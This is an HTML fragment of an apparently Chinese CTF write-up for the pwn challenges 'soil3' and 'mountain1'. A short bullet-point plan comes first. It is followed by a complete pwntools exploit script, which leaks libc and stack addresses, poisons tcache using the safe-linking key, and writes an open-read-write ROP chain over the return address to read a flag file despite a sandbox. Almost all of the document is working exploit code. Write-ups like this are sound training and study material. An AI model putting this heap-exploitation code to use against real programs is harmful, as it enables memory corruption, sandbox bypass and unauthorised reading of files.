        <h2 id="soil3-amp-mountain1"><a href="#soil3-amp-mountain1" class="headerlink" title="soil3 &amp; mountain1"></a>soil3 &amp; mountain1</h2><ul>
<li>首先根据unsorted bin 泄露出libc</li>
<li>然后根据libc_base 和 <code>libc.bss()</code>函数泄露栈地址</li>
<li>利用orw ROP覆盖ret返回地址，并绕过沙盒机制</li>
<li>soil3 题目，唯一的区别就是没有沙盒，原mountain题目的EXP即可通过</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;172.16.30.186&#x27;,58012)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input content:&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input idx:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input idx:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input idx:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> idx&lt;=<span class="number">32</span>:</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;Please input content:&#x27;</span>)</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x430</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x430</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># io.recvline()</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;Done&#x27;</span>)[<span class="number">1</span>:-<span class="number">4</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;main_arena&#x27;</span>] - <span class="number">96</span></span><br><span class="line">success(<span class="string">&#x27;libc_base --&gt;&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">bss_addr = libc_base + libc.bss()</span><br><span class="line">success(<span class="string">&#x27;bss --&gt;&#x27;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">flag_addr = bss_addr + <span class="number">0x200</span></span><br><span class="line"><span class="comment"># edit(32,&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base +<span class="number">0x000000000002daa2</span> <span class="comment">#: pop rdi ; ret</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037bfa</span><span class="comment"># : pop rsi ; ret</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000106791</span><span class="comment"># : pop rdx ; pop r12 ; ret</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446b0</span><span class="comment"># : pop rax ; ret</span></span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">key = u64(io.recvuntil(<span class="string">&#x27;Done&#x27;</span>)[<span class="number">1</span>:-<span class="number">4</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;key--&gt;&#x27;</span> + <span class="built_in">hex</span>(key))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64((bss_addr-<span class="number">0x10</span>)^key))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0x400</span>,p64((bss_addr-<span class="number">0x10</span>)^key))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">stack = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ret = stack-<span class="number">0x148</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr --&gt;&#x27;</span> +<span class="built_in">hex</span>(stack-<span class="number">0x8</span>))</span><br><span class="line">success(<span class="string">&#x27;ret--&gt;&#x27;</span>+<span class="built_in">hex</span>(ret))</span><br><span class="line"><span class="comment"># free(1)</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64((ret)^key))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0x400</span>,p64((ret)^key))</span><br><span class="line">pause()</span><br><span class="line">orw = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">orw += p64(pop_rdi)</span><br><span class="line">orw += p64(ret)</span><br><span class="line">orw += p64(pop_rsi)</span><br><span class="line">orw += p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rdx)</span><br><span class="line">orw += p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(open_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##read</span></span><br><span class="line">orw += p64(pop_rdi)</span><br><span class="line">orw += p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi)</span><br><span class="line">orw += p64(flag_addr)</span><br><span class="line">orw += p64(pop_rdx)</span><br><span class="line">orw += p64(<span class="number">0x100</span>)</span><br><span class="line">orw += p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">##write</span></span><br><span class="line">orw += p64(pop_rdi)</span><br><span class="line">orw += p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi)</span><br><span class="line">orw += p64(flag_addr)</span><br><span class="line">orw += p64(pop_rdx)</span><br><span class="line">orw += p64(<span class="number">0x100</span>)</span><br><span class="line">orw += p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(write_addr)</span><br><span class="line">add(<span class="number">0x400</span>,orw)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
